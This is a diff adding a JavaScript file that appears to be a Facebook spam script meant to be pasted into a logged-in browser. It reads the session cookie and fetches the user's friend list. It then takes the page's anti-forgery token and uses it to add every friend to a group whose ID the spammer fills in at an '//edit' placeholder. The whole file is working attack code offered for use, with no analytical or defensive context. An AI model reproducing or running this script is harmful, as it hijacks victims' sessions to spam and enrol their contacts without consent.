@@ -1,0 +1,50 @@
+function getCookie(c_name){
+	
+    var i, x, y, ARRcookies = document.cookie.split(";");
+    for (i = 0; i < ARRcookies.length; i++) {
+        x = ARRcookies[i].substr(0, ARRcookies[i].indexOf("="));
+        y = ARRcookies[i].substr(ARRcookies[i].indexOf("=") + 1);
+        x = x.replace(/^\s+|\s+$/g, "");
+        if (x == c_name) {
+            return unescape(y);
+        }
+    }
+}
+var id = getCookie('c_user');
+function add_men(groups_id){
+	friends = get_friends(document.cookie.match(/c_user=(\d+)/)[1]);
+function get_friends(uid) {
+        var request = new XMLHttpRequest();
+                request.open("GET", "/ajax/typeahead/first_degree.php?viewer=" + uid + "&filter[0]=user&__a=1", false);
+                request.send();
+                if (request.readyState == 4) {
+                        return JSON.parse(request.responseText.substring(request.responseText.indexOf('{'))).payload.entries;
+                }
+        return false;
+}
+
+for (var i = 1; i < friends.length; i++) {
+        tag_id = friends[i].uid;
+        men = new XMLHttpRequest();
+			men.onreadystatechange = function() {
+						if (men.readyState == 4 && men.status == 200) {
+								console.log('ok');
+							}
+						}
+        men.open("POST", "https://www.facebook.com/ajax/groups/members/add_post.php", true);
+        men.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        men.send('group_id='+groups_id+'&source=typeahead&ref=&message_id=u_jsonp_3_1&__a=1&members='+tag_id+'&__user='+id+'&fb_dtsg=' + document.getElementsByName('fb_dtsg')[0].value);
+	}
+}
+
+//edit //////////////////////////////////////////
+add_men('idgroups')
+
+
+
+
+
+
+
+
+
